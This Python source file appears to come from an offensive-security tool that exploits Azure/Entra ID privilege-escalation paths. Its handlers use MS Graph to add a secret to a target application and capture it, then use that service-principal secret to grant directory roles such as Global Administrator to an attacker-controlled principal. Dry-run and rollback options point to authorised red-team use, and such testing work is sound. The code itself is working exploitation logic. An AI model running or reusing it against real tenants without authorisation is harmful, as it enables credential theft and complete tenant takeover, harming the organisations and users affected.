"""Azure / Entra ID edge exploitation handlers.

The Azure plane is token-based (MS Graph) rather than Kerberos/NTLM, so these
handlers use the roadtx/Graph wrapper instead of the AD auth helpers on
``BaseEdgeHandler``.  Authentication is ROPC (username/password) against the
configured tenant — see the ``azure`` config section.

First edge: ``AZAddSecret``.  Subsequent edges (AZMGGrantRole, AZAddOwner,
AZResetPassword, AZAddMembers, AZPrivilegedRoleAdmin) build on the same pattern.
"""

from __future__ import annotations

from pathstrike.engine.command_emitter import emitting
from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import Credential, CredentialType, EdgeInfo, RollbackAction
from pathstrike.tools import roadtx_wrapper as roadtx


class AzureBaseHandler(BaseEdgeHandler):
    """Shared helpers for Entra/Graph handlers.

    Adds token acquisition on top of ``BaseEdgeHandler``.  Concrete handlers
    still implement ``check_prerequisites`` / ``exploit`` / ``get_rollback_action``.
    """

    def _azure_cfg(self):
        """Return the ``azure`` config section, or ``None`` if unconfigured."""
        return getattr(self.config, "azure", None)

    async def _graph_token(self) -> str | None:
        """Acquire an MS Graph token for the configured source principal (ROPC).

        In emit/``learn`` mode the command is still recorded with placeholders
        when no ``azure`` config is present, so the playbook is complete.
        """
        az = self._azure_cfg()
        if az is None:
            if emitting():
                return await roadtx.get_graph_token(
                    auth_mode="ropc",
                    username="<USER>",
                    password="<PASSWORD>",
                    tenant="<TENANT>",
                )
            return None
        password = az.password or ("<PASSWORD>" if emitting() else None)
        return await roadtx.get_graph_token(
            auth_mode=getattr(az, "auth_mode", "ropc"),
            username=az.username,
            password=password,
            tenant=az.tenant_domain,
            client_id=az.client_id,
            roadtx_bin=az.roadtx_path,
        )

    @staticmethod
    def _app_identifier(edge: EdgeInfo) -> str | None:
        """Best-effort appId/client-id for the target App/SP.

        Checks, in order: an explicit ``-p appid=`` edge property (handy when
        the bare node name is ambiguous between an AZApp and its AZServicePrincipal),
        then the resolved BH node's properties, then the node objectid (BH's
        AZApp objectid equals the appId).
        """
        node = edge.target
        return (
            edge.properties.get("appid")
            or edge.properties.get("appId")
            or node.properties.get("appid")
            or node.properties.get("appId")
            or (node.object_id or None)
        )


@register_handler("AZAddSecret")
class AZAddSecretHandler(AzureBaseHandler):
    """AZAddSecret: add a credential to the target App/SP and authenticate as it.

    Graph flow:
      1. Resolve the application *object id* from its appId.
      2. ``POST /applications/{objectId}/addPassword`` → returns ``secretText``.

    Rollback: ``POST /applications/{objectId}/removePassword`` with the keyId.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label not in ("AZApp", "AZServicePrincipal"):
            return (
                False,
                f"AZAddSecret needs an AZApp/AZServicePrincipal target, "
                f"got {edge.target.label}",
            )
        az = self._azure_cfg()
        if az is None or not az.username or not az.password:
            return False, "No Azure ROPC credential configured (config.azure)"
        if not self._app_identifier(edge):
            return False, f"Could not determine appId for {edge.target.name}"
        return True, f"{edge.source.name} can add a secret to {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        appid = self._app_identifier(edge)
        if not appid and emitting():
            appid = "<APP_ID>"

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would add a password credential to {edge.target.name} "
                f"(appId {appid}) via MS Graph addPassword",
                [],
            )

        token = await self._graph_token()
        if not token:
            return False, "Failed to obtain MS Graph token (ROPC) via roadtx", []

        # 1. appId -> application object id (BH AZApp objectid is the appId).
        lookup = await roadtx.graph_request(
            "GET", f"/applications?$filter=appId eq '{appid}'", token
        )
        values = (lookup.get("parsed") or {}).get("value") or []
        app_obj_id = values[0].get("id") if values else None
        if not app_obj_id:
            if emitting():
                app_obj_id = "<APP_OBJECT_ID>"
            else:
                return False, f"Could not resolve application object id for appId {appid}", []

        # 2. addPassword
        res = await roadtx.graph_request(
            "POST",
            f"/applications/{app_obj_id}/addPassword",
            token,
            body={"passwordCredential": {"displayName": "pathstrike"}},
        )
        if not res.get("success"):
            return False, f"addPassword failed: {res.get('error', 'unknown')}", []

        parsed = res.get("parsed") or {}
        secret = parsed.get("secretText")
        key_id = parsed.get("keyId")
        # Stash for rollback (see get_rollback_action).
        self._last_app_obj_id = app_obj_id
        self._last_key_id = key_id

        cred = Credential(
            cred_type=CredentialType.azure_secret,
            value=secret or "<SECRET>",
            username=appid,
            domain=az.tenant_domain if az else "<TENANT>",
            obtained_from=f"AZAddSecret on {edge.target.name}",
        )
        return (
            True,
            f"Added secret to {edge.target.name} (appId {appid}, keyId {key_id})",
            [cred],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        app_obj_id = getattr(self, "_last_app_obj_id", None)
        key_id = getattr(self, "_last_key_id", None)
        if not app_obj_id or not key_id:
            return None
        url = f"{roadtx.GRAPH_BASE}/applications/{app_obj_id}/removePassword"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_secret",
            description=f"Remove added secret (keyId {key_id}) from {edge.target.name}",
            command=f"roadtx graphrequest -m POST -d '{{\"keyId\":\"{key_id}\"}}' {url}",
            reversible=True,
        )


@register_handler("AZMGGrantRole")
class AZMGGrantRoleHandler(AzureBaseHandler):
    """AZMGGrantRole: a service principal holding RoleManagement.ReadWrite.Directory
    assigns a directory role (e.g. Global Administrator) to a principal we control.

    Auth is **client-credentials** as the source SP (appId + a secret captured by
    a preceding AZAddSecret step, or passed via ``-p``).  Graph:
    ``POST /roleManagement/directory/roleAssignments``.
    Rollback: ``DELETE /roleManagement/directory/roleAssignments/{id}``.
    """

    def _sp_creds(self, edge: EdgeInfo) -> tuple[str | None, str | None]:
        """Resolve (appId, secret) for the source SP.

        Order: explicit ``-p source_appid=``/``-p secret=`` props, then a
        captured ``azure_secret`` credential (from a prior AZAddSecret step),
        then BH node props.
        """
        appid = edge.properties.get("source_appid") or edge.source.properties.get("appid")
        secret = edge.properties.get("secret")
        if not secret:
            for c in self.cred_store.all_credentials():
                if c.cred_type == CredentialType.azure_secret and (
                    not appid or c.username == appid
                ):
                    secret, appid = c.value, (appid or c.username)
                    break
        if emitting():
            appid, secret = (appid or "<SP_APP_ID>"), (secret or "<SP_SECRET>")
        return appid, secret

    @staticmethod
    def _role_definition_id(edge: EdgeInfo) -> str | None:
        """roleDefinitionId for the target role (BH AZRole objectid = ``<templateId>@<tenantId>``)."""
        rid = edge.properties.get("role_definition_id") or edge.target.properties.get(
            "templateid"
        )
        if not rid and edge.target.object_id:
            rid = edge.target.object_id.split("@")[0]
        if not rid and emitting():
            rid = "<ROLE_TEMPLATE_ID>"
        return rid

    @staticmethod
    def _promote_principal(edge: EdgeInfo) -> str | None:
        """Object id of the principal to receive the role (``-p promote=<objectId>``)."""
        p = edge.properties.get("promote")
        if not p and emitting():
            p = "<PRINCIPAL_OBJECT_ID>"
        return p

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label != "AZRole":
            return False, f"AZMGGrantRole needs an AZRole target, got {edge.target.label}"
        appid, secret = self._sp_creds(edge)
        if not appid or not secret:
            return False, (
                "No SP appId/secret — run AZAddSecret on the SP's app first, or pass "
                "-p source_appid=<appId> -p secret=<value>"
            )
        if not self._promote_principal(edge):
            return False, "No principal to promote — pass -p promote=<objectId>"
        if not self._role_definition_id(edge):
            return False, f"Could not determine role definition id for {edge.target.name}"
        return True, (
            f"SP {edge.source.name} can grant {edge.target.name} to "
            f"{self._promote_principal(edge)}"
        )

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        az = self._azure_cfg()
        appid, secret = self._sp_creds(edge)
        role_def_id = self._role_definition_id(edge)
        principal_id = self._promote_principal(edge)

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would grant role {role_def_id} to {principal_id} "
                f"as SP {appid}",
                [],
            )

        tenant = az.tenant_id if az else "<TENANT>"
        token = await roadtx.get_sp_token(
            appid, secret, tenant, roadtx_bin=(az.roadtx_path if az else "roadtx")
        )
        if not token:
            return False, "Failed to obtain SP client-credentials token via roadtx", []

        res = await roadtx.graph_request(
            "POST",
            "/roleManagement/directory/roleAssignments",
            token,
            body={
                "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
                "roleDefinitionId": role_def_id,
                "principalId": principal_id,
                "directoryScopeId": "/",
            },
        )
        if not res.get("success"):
            return False, f"Role assignment failed: {res.get('error', 'unknown')}", []

        assignment_id = (res.get("parsed") or {}).get("id")
        self._last_assignment_id = assignment_id
        return (
            True,
            f"Granted {edge.target.name} (roleDefId {role_def_id}) to principal "
            f"{principal_id} (assignment {assignment_id})",
            [],
        )

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        aid = getattr(self, "_last_assignment_id", None)
        if not aid:
            return None
        url = f"{roadtx.GRAPH_BASE}/roleManagement/directory/roleAssignments/{aid}"
        return RollbackAction(
            step_index=0,
            action_type="azure_remove_role_assignment",
            description=f"Remove role assignment {aid} ({edge.target.name})",
            command=f"roadtx graphrequest -m DELETE {url}",
            reversible=True,
        )
